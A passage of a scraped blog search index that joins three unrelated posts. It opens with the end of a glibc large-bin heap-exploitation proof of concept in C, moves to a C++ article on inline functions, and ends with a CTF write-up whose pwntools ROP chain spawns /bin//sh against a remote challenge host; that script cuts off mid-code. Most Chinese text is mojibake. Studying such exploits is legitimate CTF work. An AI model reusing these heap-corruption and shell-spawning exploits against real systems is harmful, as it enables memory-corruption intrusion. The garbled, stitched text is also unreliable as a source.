printf(\u0026#34;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \\n\\n\u0026#34;); printf(\u0026#34;====================================================================\\n\\n\u0026#34;); size_t target = 0; printf(\u0026#34;Here is the target we want to overwrite (%p) : %lu\\n\\n\u0026#34;,\u0026amp;target,target); size_t *p1 = malloc(0x428); printf(\u0026#34;First, we allocate a large chunk [p1] (%p)\\n\u0026#34;,p1-2); size_t *g1 = malloc(0x18); printf(\u0026#34;And another chunk to prevent consolidate\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); size_t *p2 = malloc(0x418); printf(\u0026#34;We also allocate a second large chunk [p2] (%p).\\n\u0026#34;,p2-2); printf(\u0026#34;This chunk should be smaller than [p1] and belong to the same large bin.\\n\u0026#34;); size_t *g2 = malloc(0x18); printf(\u0026#34;Once again, allocate a guard chunk to prevent consolidate\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); free(p1); printf(\u0026#34;Free the larger of the two --\u0026gt; [p1] (%p)\\n\u0026#34;,p1-2); size_t *g3 = malloc(0x438); printf(\u0026#34;Allocate a chunk larger than [p1] to insert [p1] into large bin\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); free(p2); printf(\u0026#34;Free the smaller of the two --\u0026gt; [p2] (%p)\\n\u0026#34;,p2-2); printf(\u0026#34;At this point, we have one chunk in large bin [p1] (%p),\\n\u0026#34;,p1-2); printf(\u0026#34; and one chunk in unsorted bin [p2] (%p)\\n\u0026#34;,p2-2); printf(\u0026#34;\\n\u0026#34;); p1[3] = (size_t)((\u0026amp;target)-4); printf(\u0026#34;Now modify the p1-\u0026gt;bk_nextsize to [target-0x20] (%p)\\n\u0026#34;,(\u0026amp;target)-4); printf(\u0026#34;\\n\u0026#34;); size_t *g4 = malloc(0x438); printf(\u0026#34;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\\n\u0026#34;, p2-2, p2-2); printf(\u0026#34;Since glibc does not check chunk-\u0026gt;bk_nextsize if the new inserted chunk is smaller than smallest,\\n\u0026#34;); printf(\u0026#34; the modified p1-\u0026gt;bk_nextsize does not trigger any error\\n\u0026#34;); printf(\u0026#34;Upon inserting [p2] (%p) into largebin, [p1](%p)-\u0026gt;bk_nextsize-\u0026gt;fd-\u0026gt;nexsize is overwritten to address of [p2] (%p)\\n\u0026#34;, p2-2, p1-2, p2-2); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\\n\u0026#34;, p2-2, (void *)target); printf(\u0026#34;Target (%p) : %p\\n\u0026#34;,\u0026amp;target,(size_t*)target); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;====================================================================\\n\\n\u0026#34;); assert((size_t)(p2-2) == target); return 0; } å› ä¸ºä¼ ç»Ÿçš„large bin attackä¾èµ–äºå¯¹bkå’Œbk_nextsizeçš„ä¿®æ”¹ï¼Œæ‰€ä»¥glibcåœ¨è¿™ä¸¤ä¸ªä¸Šé¢åŠ äº†æ£€æŸ¥ï¼š\n// fwd = p2 // bck = p2-\u0026gt;bk if (__glibc_unlikely (fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd)) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\u0026#34;); if (bck-\u0026gt;fd != fwd) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (bk)\u0026#34;); è¿™å°±è¦æ±‚ä¼ ç»Ÿçš„large bin attackä¸­fwd-\u0026gt;bk_nextsizeæŒ‡å‘çš„ä¼ªé€ çš„chunkçš„fd_nextsizeçš„å€¼æ˜¯fwdï¼ˆäº’ç›¸è”é€šï¼‰ï¼›è¦æ±‚fwd-\u0026gt;bkæŒ‡å‘çš„ä¼ªé€ çš„chunkçš„fdçš„å€¼æ˜¯fwdã€‚\nç„¶è€Œè¿™ä¸ªæ£€æŸ¥æœ‰ä¸ªå·¨å¤§çš„æ¼æ´å°±æ˜¯ï¼Œå½“æ’å…¥chunkçš„å¤§å°æ¯”è¿™ä¸ªbinä¸­æœ€å°çš„chunkçš„å¤§å°éƒ½è¦å°çš„æ—¶å€™ï¼Œæ˜¯ä¸ä¼šæ‰§è¡Œè¿™ä¸¤ä¸ªæ£€æŸ¥çš„ï¼š\n// å¦‚æœè¯·æ±‚å¤§å°æ¯”è¯¥ large bin ä¸­æœ€å°çš„å—è¿˜å°ï¼Œåˆ™è·³è¿‡ä¸‹é¢çš„å¾ªç¯ assert (chunk_main_arena (bck-\u0026gt;bk)); if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { fwd = bck; bck = bck-\u0026gt;bk; // å°† victim æ’å…¥åˆ° fwd çš„å‰é¢ victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } å› æ­¤ï¼Œå½“æˆ‘ä»¬å°†ä¸€ä¸ªæ›´å°çš„chunkæ’å…¥æœ‰ä¸€ä¸ªchunkçš„large binï¼ˆä¸¤è€…çš„indexä¸€æ ·ï¼‰æ—¶ï¼Œç›¸å½“äºåå‘åœ°è¿›è¡Œä¼ ç»Ÿçš„large bin attack\nå…¶ä¸­ï¼Œvictim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victimå°±ç›¸å½“äºfwd-\u0026gt;fd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victimç›¸å½“äºp1-\u0026gt;bk_nextsize-\u0026gt;fd_nexsize = victimï¼Œè€Œp1-\u0026gt;bk_nextsizeè¢«æˆ‘ä»¬ä¿®æ”¹æˆäº†(size_t)((\u0026amp;target)-4)ï¼Œå› æ­¤æ­¤æ—¶å°±ä¼šæŠŠtargetä¿®æ”¹æˆvictimï¼Œä¹Ÿå°±æ˜¯p2çš„æŒ‡é’ˆ\np1[3] = (size_t)((\u0026amp;target)-4); ç›¸å…³æºç  ä»¥ä¸‹æºç æ³¨é‡Šæ¥è‡ªchatgpt\nif (in_smallbin_range (size)) // å¦‚æœè¯·æ±‚å¤§å°åœ¨ small bin çš„èŒƒå›´å†… { // æ‰¾åˆ° victim æ‰€åœ¨çš„ small bin çš„ç´¢å¼• victim_index = smallbin_index (size); // bck æŒ‡å‘ small bin èµ·å§‹å— bck = bin_at (av, victim_index); // fwd æŒ‡å‘ä¸‹ä¸€ä¸ª small bin çš„èµ·å§‹å— fwd = bck-\u0026gt;fd; } else // è¯·æ±‚å¤§å°åœ¨ large bin çš„èŒƒå›´å†… { // æ‰¾åˆ° victim æ‰€åœ¨çš„ large bin çš„ç´¢å¼• victim_index = largebin_index (size); // bck æŒ‡å‘ large bin èµ·å§‹å— bck = bin_at (av, victim_index); // fwd æŒ‡å‘ large bin èµ·å§‹å—çš„ä¸‹ä¸€ä¸ªå— fwd = bck-\u0026gt;fd; // ç»´æŠ¤ large bin çš„æœ‰åºæ€§ if (fwd != bck) // å¦‚æœè¯¥ large bin ä¸­æœ‰ä¸€ä¸ªæˆ–æ›´å¤šç©ºé—²å— { // å°† size å’Œ PREV_INUSE æŒ‰ä½æˆ–ä»¥åŠ é€Ÿæ¯”è¾ƒ size |= PREV_INUSE; // å¦‚æœè¯·æ±‚å¤§å°æ¯”è¯¥ large bin ä¸­æœ€å°çš„å—è¿˜å°ï¼Œåˆ™è·³è¿‡ä¸‹é¢çš„å¾ªç¯ assert (chunk_main_arena (bck-\u0026gt;bk)); if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { fwd = bck; bck = bck-\u0026gt;bk; // å°† victim æ’å…¥åˆ° fwd çš„å‰é¢ victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } else // åœ¨ large bin ä¸­é¡ºåºæŸ¥æ‰¾ç¬¦åˆè¯·æ±‚å¤§å°çš„å— { assert (chunk_main_arena (fwd)); while ((unsigned long) size \u0026lt; chunksize_nomask (fwd)) { fwd = fwd-\u0026gt;fd_nextsize; assert (chunk_main_arena (fwd)); } if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) // æ€»æ˜¯å°† victim æ’å…¥åˆ°ç¬¬äºŒä¸ªä½ç½® fwd = fwd-\u0026gt;fd; else // æ’å…¥åˆ°é€‚å½“çš„ä½ç½® { victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; if (__glibc_unlikely (fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd)) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\u0026#34;); fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } // æ›´æ–° bck bck = fwd-\u0026gt;bk; if (bck-\u0026gt;fd != fwd) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (bk)\u0026#34;); } } else // è¯¥ large bin ä¸­ä¸€ä¸ªç©ºé—²å—ä¹Ÿæ²¡æœ‰ victim-\u0026gt;fd_nextsize = victim-\u0026gt;bk_nextsize = victim; } // å°†è¯¥ bin æ ‡è®°ä¸ºéç©ºé—²çŠ¶æ€ mark_bin (av, victim_index); // å°† victim æ’å…¥åˆ° bck å’Œ fwd ä¹‹é—´ victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; ","date":"2023å¹´02æœˆ20æ—¥","permalink":"https://peterliuzhi.top/principle/largebin_attack/","section":"principle","summary":"When you begin to touch your heart or let your heart be touched, you begin to discover that it\u0026rsquo;s bottomless. â€” Pema ChÃ¶drÃ¶n Large binçš„æ•°æ®ç»“æ„ ä½•æ—¶ä¼šè¿›å…¥large binä¸­ï¼Ÿ Large binç”¨æ¥å‚¨å­˜é‡Šæ”¾æ‰çš„å¤§chunkã€‚ å½“é‡Šæ”¾","tags":["pwn","largebin","heap"],"title":"Largebin_Attack"},{"categories":["posts","C++","develop"],"contents":" Numberless are the worlds wonders, but none more wonderful than man. â€” Sophocles\nå¼•å…¥ åœ¨C++ä¸­æˆ‘ä»¬ç»å¸¸ä½¿ç”¨inlineå†…è”å‡½æ•°æ¥ä»£æ›¿å®ï¼Œè€Œå®æ˜¯åœ¨é¢„ç¼–è¯‘é˜¶æ®µè¿›è¡Œç®€å•çš„æ›¿æ¢ï¼Œé‚£å†…è”å‡½æ•°ä¼šäº§ç”Ÿä»€ä¹ˆæ•ˆæœå‘¢ï¼Ÿ\næˆ‘å†™äº†ä¸€ä¸ªç®€å•çš„å°ç¨‹åºæ¥éªŒè¯è¿™ä¸ªé—®é¢˜ï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define ONE 1 inline char _IndexFromEnd(std::string\u0026amp; num_str, char position) { // å¦‚æœè¶Šç•Œï¼Œè¿”å›\u0026#39;0\u0026#39;ï¼Œåœ¨StringNumAddOrSubä¸­è®¡ç®—ä¼šå¾—åˆ°0 if (position \u0026gt;= num_str.length()) return \u0026#39;0\u0026#39;; // ä»åå¾€å‰æ•° return num_str.at((num_str.length() - 1) - position); } inline char get_one(){ return ONE; } int\tmain(int argc, char **argv) { std::string num = \u0026#34;123456\u0026#34;; char a = _IndexFromEnd(num, 1); char b = _IndexFromEnd(num, 100); char c = get_one(); putchar(a); putchar(\u0026#39; \u0026#39;); putchar(b); putchar(\u0026#39; \u0026#39;); putchar(c); return 0; } ç„¶åå¾—åˆ°äº†é¢„ç¼–è¯‘ç»“æœã€æ™®é€šç¼–è¯‘é“¾æ¥ç»“æœã€ä¼˜åŒ–ç¼–è¯‘é“¾æ¥ç»“æœï¼š\næŸ¥çœ‹é¢„ç¼–è¯‘ç»“æœ é¢„ç¼–è¯‘å™¨å°†includeçš„å¤´æ–‡ä»¶ç®€å•åœ°å¤åˆ¶åˆ°äº†æˆ‘ä»¬ä»£ç ä¸­includeçš„ä½ç½®ï¼Œå› æ­¤æœ€åæˆ‘ä»¬å¾—åˆ°çš„é¢„ç¼–è¯‘ç»“æœä¸­ï¼Œæˆ‘ä»¬è‡ªå·±å†™çš„ä»£ç ä½äºå…­ä¸‡å¤šè¡Œçš„ä½ç½®ï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬defineçš„å®ONEå·²ç»è¢«ç®€å•åœ°æ›¿æ¢æ‰äº†ï¼Œä½†æ˜¯inlineå‡½æ•°å¹¶æ²¡æœ‰è¿›è¡Œæ›¿æ¢\næŸ¥çœ‹æ™®é€šç¼–è¯‘é“¾æ¥ç»“æœ æˆ‘ä»¬ä½¿ç”¨idaè¿›è¡Œåç¼–è¯‘åå¯ä»¥çœ‹åˆ°è¿™é‡Œå†…è”å‡½æ•°å¹¶æ²¡æœ‰åµŒå…¥åˆ°ä¸»å‡½æ•°ä¹‹ä¸­ï¼Œè€Œæ˜¯åƒä¸€ä¸ªæ™®é€šçš„å‡½æ•°ä¸€æ ·è¢«è°ƒç”¨\nè€Œä¸”åŒæ ·æœ‰ä¼ å‚çš„æ“ä½œï¼š\næˆ–è®¸è¿™å°±æ˜¯å†…è”å‡½æ•°èƒ½å¤Ÿè¢«è°ƒè¯•çš„åŸå› â€”â€”åœ¨è°ƒè¯•ç‰ˆæœ¬çš„ç¨‹åºä¸­ï¼Œå®ƒå’Œæ™®é€šå‡½æ•°å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«\nä¼˜åŒ–ç¼–è¯‘é“¾æ¥ç»“æœ ä¼˜åŒ–åæˆ‘ä»¬å‘ç°ä¸»å‡½æ•°å·²ç»å˜æˆäº†æˆ‘ä»¬ä¸è®¤è¯†çš„æ ·å­ï¼š\nè€Œå…¶ä¸­é‚£ä¸ªåªæ˜¯è¿”å›äº†1çš„å†…è”å‡½æ•°ç›´æ¥æ¶ˆå¤±äº†ï¼Œå˜æˆäº†å¸¸é‡å€¼è¢«æ‰“å°å‡ºæ¥ï¼š\nè€Œè¿™é‡Œsub_1004016B0å‡½æ•°ä¹Ÿä¸å†æ˜¯æˆ‘ä»¬å†™çš„å†…è”å‡½æ•°ï¼Œè€Œæ˜¯å˜æˆäº†æ··åˆäº†basic_stringä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼ˆåº”è¯¥å°±æ˜¯æˆ‘ä»¬åœ¨å†…è”å‡½æ•°ä¸­è°ƒç”¨çš„atå‡½æ•°ï¼‰çš„å‡½æ•°ï¼Œæˆ–è€…è¯´ï¼Œå®ƒå°†atå‡½æ•°åµŒå…¥åˆ°äº†æˆ‘ä»¬çš„å‡½æ•°ä¸­ï¼š\nè€ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹atçš„æºä»£ç ï¼š\nä¼šå‘ç°è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯è¢«constexprä¿®é¥°çš„ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªåœ¨ç¼–è¯‘å™¨ç¡®å®šçš„å¸¸é‡\nå¦‚æœæˆ‘ä»¬å°†get_oneç¡®å®šä¸ºconstexprè¿”å›å€¼çš„å‡½æ•°ï¼Œåˆ™å®ƒä¸€å®šä¼šåœ¨ç¼–è¯‘æœŸè¿›è¡Œè®¡ç®—ï¼Œå°±ç®—åŠ ä¸Š-gï¼š\nä¸éå†…è”å‡½æ•°å¯¹æ¯” æˆ‘ä»¬è¯•ç€ä¸éå†…è”å‡½æ•°å¯¹æ¯”ï¼š\nåœ¨-gçš„æ—¶å€™å¹¶æ²¡æœ‰åŒºåˆ«ï¼š\nç„¶åæˆ‘ä»¬å†çœ‹ä¸‹-O2çš„æ—¶å€™ï¼š\nè¿™å®Œå…¨æ²¡å·®å˜›ï¼æ‰€ä»¥è¯´å¦‚æœä½ è‡ªå·±éƒ½ä¸çŸ¥é“å†…è”ä¼šæ€ä¹ˆå‘ç”Ÿï¼Œå°±ä¸è¦æœŸæœ›å†…è”çœŸæ­£èµ·æ•ˆäº†ã€‚\nå¦‚æœæˆ‘ä»¬å°†ä»£ç ä¸­çš„å¤æ‚è¿”å›é€»è¾‘æ”¹æ‰ï¼Œæˆ‘ä»¬ä¼šå‘ç°å†…è”\u0026quot;å‘ç”Ÿ\u0026quot;äº†ï¼š\nè¿™çœ‹ä¸Šå»å¥½åƒæ²¡æœ‰å‘ç”Ÿå†…è”ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹sub_1004016B0å‡½æ•°ä¼šå‘ç°ï¼Œç”±äºå†…è”å‡½æ•°å†…è°ƒç”¨äº†å¦ä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¾—åˆ°çš„æœ€ç»ˆç»“æœè¿˜æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚\nä½†æ˜¯ç”±äºä¼˜åŒ–å¼€å¯ï¼Œæ‰€ä»¥å°±ç®—æ˜¯æ™®é€šå‡½æ•°ä¹Ÿä¼šå˜æˆè¿™æ ·ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ ·çš„å†…è”å¹¶æ— æ„ä¹‰ï¼ˆå› ä¸ºä¸å¼€å¯ä¼˜åŒ–å†…è”ä¸ä¼šå‘ç”Ÿï¼‰\nå› æ­¤ï¼Œä¸è¦åœ¨å†…è”å‡½æ•°å†…è¿›è¡ŒåµŒå¥—è°ƒç”¨ï¼ˆæˆ–è€…é€’å½’ï¼‰\nå†…è”å‡½æ•°åµŒå¥—è°ƒç”¨å†…è”å‡½æ•° é‚£å¦‚æœæˆ‘åµŒå¥—è°ƒç”¨çš„æ˜¯ä¸€ä¸ªå†…è”å‡½æ•°å‘¢ï¼Œæƒ…å†µä¼šä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Ÿ\nç­”æ¡ˆæ˜¯ç¡®å®šçš„ï¼Œä¼˜åŒ–å¼€å¯çš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨ç›´æ¥è®¡ç®—å‡ºäº†ç»“æœï¼š\nè€Œåœ¨-gçš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨ç”šè‡³è¿è¿™ç§å¸¸é‡ç»“æœéƒ½æ²¡æœ‰è®¡ç®—å‡ºæ¥ï¼š\næˆ–è®¸ä½ ä¼šé—®ï¼Œå¦‚æœè¿”å›å€¼ä¸æ˜¯ä¸€ä¸ªå­—é¢å¸¸é‡å‘¢ï¼Ÿå°±åƒä¸‹é¢è¿™æ ·ï¼š\næ˜¾ç„¶å†…è”å‘ç”Ÿäº†ï¼š\nå› æ­¤ï¼Œä¸€ä¸ªè¿”å›é€»è¾‘ç®€å•çš„å†…è”å‡½æ•°è°ƒç”¨å¦ä¸€ä¸ªè¿”å›é€»è¾‘ç®€å•çš„å†…è”å‡½æ•°åœ¨ä¼˜åŒ–å¼€å¯çš„æƒ…å†µä¸‹ç¡®å®æ˜¯ä¼šå‘ç”Ÿå†…è”çš„\nç»“è®º å› æ­¤ï¼Œæˆ‘ä»¬é€šè¿‡è¿™äº›ç®€ç•¥çš„äº‹å®èƒ½å¤Ÿå¾—åˆ°ä¸€ä¸ªç²—ç³™çš„ç»“è®ºï¼š\nå†…è”å‡½æ•°åœ¨ç¼–è¯‘å™¨ä¼˜åŒ–ä¹‹å‰å’Œæ™®é€šå‡½æ•°å¹¶æ— å·®åˆ«ï¼Œåœ¨ä¼˜åŒ–ä¹‹åä¸€äº›å…·æœ‰è¾ƒå¤æ‚è¿”å›é€»è¾‘çš„å†…è”å‡½æ•°ä¹Ÿæ— æ³•å†…è”ã€‚åŒæ—¶å°±ç®—è¿”å›é€»è¾‘ç®€å•ï¼Œä¹Ÿè¦é¿å…åµŒå¥—éå†…è”å‡½æ•°ï¼Œå› ä¸ºè¿™åœ¨ä¼˜åŒ–å¼€å¯çš„æƒ…å†µä¸‹å¹¶æ— æ„ä¹‰ã€‚\nå› æ­¤ï¼Œå¦‚æœå‡½æ•°è¿”å›çš„å€¼æ˜¯ä¸€ä¸ªåœ¨ç¼–è¯‘æœŸèƒ½å¤Ÿç¡®å®šçš„å¸¸å€¼ï¼Œå°½é‡ä½¿ç”¨constexprä¿®é¥°è¿”å›å€¼ï¼›ä¸è¦åµŒå¥—éå†…è”å‡½æ•°ï¼Œä¸è¦å¤æ‚åŒ–å†…è”å‡½æ•°çš„è¿”å›é€»è¾‘\nå¯è§ï¼Œå†…è”å‡½æ•°çš„å®ç°è¾ƒä¸ºå¤æ‚ï¼Œå¦‚æœæœŸæœ›é€šè¿‡å†…è”å‡½æ•°ä¼˜åŒ–ç¨‹åºï¼Œä¸€å®šè¦è°¨æ…è¡Œäº‹ï¼Œå› ä¸ºè™½ç„¶å†…è”å‡½æ•°è‡³å°‘ä¸ä¼šè®©ç¨‹åºæ€§èƒ½é™ä½ï¼Œä½†æ˜¯ä¼šç»™ä»£ç é˜…è¯»è€…é€ æˆå›°æƒ‘å¹¶å°†ä»–ä»¬çš„æ€è·¯å¼•å¯¼å‘é”™è¯¯çš„æ–¹å‘ï¼ŒæŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼Œå®ƒè®©ä»£ç æ–‡å­—çš„â€œæ•ˆç‡â€é™ä½äº†\nâœï¸ä½œè€…è¿˜æ˜¯C++åˆå­¦è€…ï¼Œå› å¯¹å†…è”å‡½æ•°çš„è¡Œä¸ºæœ‰æ‰€ç–‘æƒ‘æ‰è¯•å›¾ç”¨è‡ªå·±ç¬¨æ‹™çš„æ–¹å¼æ¢å¯»çœŸç›¸ï¼Œå¦‚æœé”™æ¼ï¼Œæ•¬è¯·è§è°…ğŸ™\n","date":"2023å¹´02æœˆ07æ—¥","permalink":"https://peterliuzhi.top/posts/c++%E4%B8%ADinline%E5%87%BD%E6%95%B0%E6%9C%80%E7%BB%88%E9%80%A0%E6%88%90%E4%BA%86%E4%BB%80%E4%B9%88%E6%95%88%E6%9E%9C/","section":"posts","summary":"Numberless are the worlds wonders, but none more wonderful than man. â€” Sophocles å¼•å…¥ åœ¨C++ä¸­æˆ‘ä»¬ç»å¸¸ä½¿ç”¨inlineå†…è”å‡½æ•°æ¥ä»£æ›¿å®ï¼Œè€Œå®æ˜¯åœ¨é¢„ç¼–è¯‘é˜¶æ®µè¿›è¡Œç®€å•çš„æ›¿æ¢ï¼Œé‚£å†…è”å‡½æ•°ä¼šäº§ç”Ÿä»€ä¹ˆæ•ˆæœå‘¢ï¼Ÿ æˆ‘å†™äº†","tags":["C++","inline"],"title":"C++ä¸­inlineå‡½æ•°æœ€ç»ˆé€ æˆäº†ä»€ä¹ˆæ•ˆæœï¼Ÿ"},{"categories":["writeup"],"contents":" Never mistake motion for action. â€” Ernest Hemingway\nsictf_pwn\nC@na2y checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  æ³•ä¸€ï¼šç›´æ¥ç”¨ropperæˆ–è€…ROPgadgetç”ŸæˆROPé“¾ æœ€ç®€å•çš„æ–¹æ³•ï¼Œä½¿ç”¨ropperæˆ–è€…ROPgadgetç”Ÿæˆï¼ˆROPgadgetæ¯”è¾ƒå¥½ï¼Œä¼šåŒºåˆ†byteså’Œstrï¼‰ï¼Œå¯ä»¥ç›´æ¥getshellï¼Œä½†æ˜¯æˆ‘è‡ªå·±ç”Ÿæˆçš„æ—¶å€™å´æ²¡æœ‰æˆåŠŸï¼Œå‡ºæ¥çš„ROPé“¾æ— æ³•ä½¿ç”¨ï¼Œè¿™é‡Œæ”¾ä¸€ä¸‹å¦ä¸€ä½å¤§ä½¬çš„expï¼š\nä½¿ç”¨å‘½ä»¤ROPgadget.py --binary pwn --ropchainç”Ÿæˆï¼š\nfrom pwn import * io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;ctf.qsnctf.com\u0026#39;,10499) from struct import pack # Padding goes here p = b\u0026#39;\u0026#39; p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da060) # @ .data #p += p32(0x080a90d6) # pop eax ; ret p += p32(0x08056464) # pop eax ; pop edx ; pop ebx ; ret p += b\u0026#39;/bin\u0026#39; p += p32(0x080da060)*2 # @ .data p += p32(0x08056f95) # mov dword ptr [edx], eax ; ret p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da064) # @ .data + 4 p += p32(0x08056464) # pop eax ; pop edx ; pop ebx ; ret #p += p32(0x080a90d6) # pop eax ; ret p += b\u0026#39;//sh\u0026#39; p += p32(0x080da064)*2 # @ .data + 4 p += p32(0x08056f95) # mov dword ptr [edx], eax ; ret p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da068) # @ .data + 8 p += p32(0x08056550) # xor eax, eax ; ret p += p32(0x08056f95) # mov dword ptr [edx], eax ; ret p += p32(0x080481c9) # pop ebx ; ret p += p32(0x080da060) # @ .data p += p32(0x0806ee52) # pop ecx ; pop ebx ; ret p += p32(0x080da068) # @ .data + 8 p += p32(0x080da060) # padding without overwrite ebx p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da068) # @ .data + 8 p += p32(0x08056550) # xor eax, eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x08049623) # int 0x80 pay = b\u0026#39;/flag;AAABBBCCCDDDEEEFFFAAAA\u0026#39; + p #gdb.attach(io,\u0026#39;b *0x080488D0\u0026#39;) io.send(pay) fmt2 SiLibrary #io = remote() io.interactive() è¿™ä¸ªä»£ç æˆ‘æµ‹è¯•è¿‡ï¼Œæ˜¯å®é™…å¯ç”¨çš„ï¼Œä½†æ˜¯æˆ‘è‡ªå·±ç”Ÿæˆçš„æ—¶å€™å´æ— æ³•è¿˜åŸï¼Œå¯èƒ½å’Œæˆ‘çš„ç¯å¢ƒæœ‰å…³\næ³•äºŒï¼šä½¿ç”¨winå‡½æ•°ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æŸ¥çœ‹flagå†…å®¹ ç¨‹åºç»™äº†ä¸€ä¸ªwinå‡½æ•°æ¥å°†flagè¯»å…¥åˆ°æ ˆå†…ï¼š\nå› ä¸ºflagåœ¨ä¸€ä¸ªè¿œç¨‹ç¯å¢ƒä¸­æ˜¯ä¸å˜çš„ï¼Œè€Œç¨‹åºé™åˆ¶v2çš„è¯»å…¥é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸€ä¸ªä¸€ä¸ªåœ°è¯»å…¥ï¼š\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes todo = [] def pwn(times: int): global todo rmt: bool = False fn: str = \u0026#34;./sictf-C@na2y\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;10023\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;ctf.qsnctf.com\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x8048951 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, 